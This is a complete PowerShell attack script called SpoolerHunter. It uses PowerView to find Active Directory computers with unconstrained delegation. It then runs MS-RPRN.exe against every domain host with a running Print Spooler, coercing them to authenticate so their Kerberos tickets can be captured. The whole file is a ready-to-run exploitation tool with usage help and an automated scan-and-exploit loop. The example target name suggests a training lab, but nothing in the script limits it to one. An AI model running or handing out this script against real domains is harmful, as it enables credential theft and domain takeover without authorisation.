param(
    [string]$TargetMachine = $null,
    [switch]$Verbose,
    [switch]$h
)
if (-not $TargetMachine -and -not $Verbose -and $h)
{
    Write-Host @"
    NAME
    SpoolerHunter - Performs a scan for unconstrained delegation computers and exploits them using MS-RPRN.exe.

    DESCRIPTION
        This script performs a scan for unconstrained delegation computers in the domain by using PowerView and exploits them using the MS-RPRN.exe tool. 
        It provides options to specify a target machine which is allowed to delegate and enable verbose output.

    SYNTAX
        .\SpoolerHunter.ps1 [[-TargetMachine] <String>] [-Verbose] [-h]

    PARAMETERS
        -TargetMachine <String>
            Specifies the target machine for the scan. If not provided, the script scans for unconstrained delegation computers in the domain.

        -Verbose
            Enables verbose output. Displays detailed information about the scan and exploitation process.

    EXAMPLES
        Example 1:
        PS C:\> .\SpoolerHunter.ps1 -Verbose
        Runs the script with verbose output enabled.

        Example 2:
        PS C:\> .\SpoolerHunter.ps1 -TargetMachine 'dcorp-srv'
        Runs the script with a specific target machine that has unconstrained delegation enabled.

    NOTES
        Author: Ismail Barrous
        Date: 28-03-2024
        Version: 1.0

"@
    exit
}

function ExitFunction {
    Write-Host "Exiting."
    Remove-Module PowerView
    exit
}

try {
    if (Get-Module PowerView){
        Remove-Module PowerView
    }
    # Import PowerView module
    Import-Module .\PowerView.ps1 -ErrorAction Stop
} catch {
    Write-Error "Failed to import the PowerView module: $_"
    ExitFunction
}

if (-not $TargetMachine) {
    Write-Host "[ x ] TargetMachine Parameter Is Not Provided." -ForegroundColor Red
    Write-Host "[...] Running A Scan For Unconstrained Delegation Computers..." -ForegroundColor Yellow
    $Targeted_Computers = Get-DomainComputer -UnConstrained
    $Count = $Targeted_Computers.count
    Write-Host -NoNewline "[ + ] Scan Completed ! " -ForegroundColor Green
    if ($Count -lt 1) {
        Write-Host "0 Results Found." -ForegroundColor Green
        ExitFunction
    }
    Write-Host "$Count Results Found." -ForegroundColor Green
    if ($Verbose)
    {
        foreach($target in $Targeted_Computers){
            $targetName = $target.Name
            Write-Host "    ----> $targetName" -ForegroundColor Green
        }
    }
} else {
    $Targeted_Computers = $TargetMachine
}

# Get all computers in the domain
$SpoolerComputers = Get-DomainComputer

# Loop through each computer
foreach ($computer in $SpoolerComputers) {
    $computerName = $computer.Name
    $computerDNSHostName = $computer.dnshostname
    if ($Verbose){
        Write-Host "[...] Checking $computerName" -ForegroundColor Yellow
    }
    # Check if the Spooler service is running on the computer
    $spoolerService = Get-Service -ComputerName $computerName -Name Spooler -ErrorAction SilentlyContinue
    if ($spoolerService -ne $null) {
        Write-Host "[ + ] Spooler service is running on $ComputerName" -ForegroundColor Green
        #loop through each computer that has unconstrained delegation
        foreach ($target in $Targeted_Computers) {
            if ($TargetMachine) {
                $targetName = $targetDNSHostName = $TargetMachine
            } else {
                $targetName = $target.Name
                $targetDNSHostName = $target.dnshostname
            }
            Write-Host "[...] Exploiting $ComputerName with $targetName" -ForegroundColor Yellow
            # Run MS-RPRN.exe
            $output = & ".\MS-RPRN.exe" "\\$computerDNSHostName" "\\$targetDNSHostName"
            if ($Verbose){
                Write-Host "[ ? ] $output"
            }
            Write-Host "[ * ] Exploitation Completed." -ForegroundColor DarkYellow
        }
    }
    else{
        if ($Verbose){
            Write-Host "[ ! ] No Results Were Found !" -ForegroundColor Red
        }
    }
}

ExitFunction
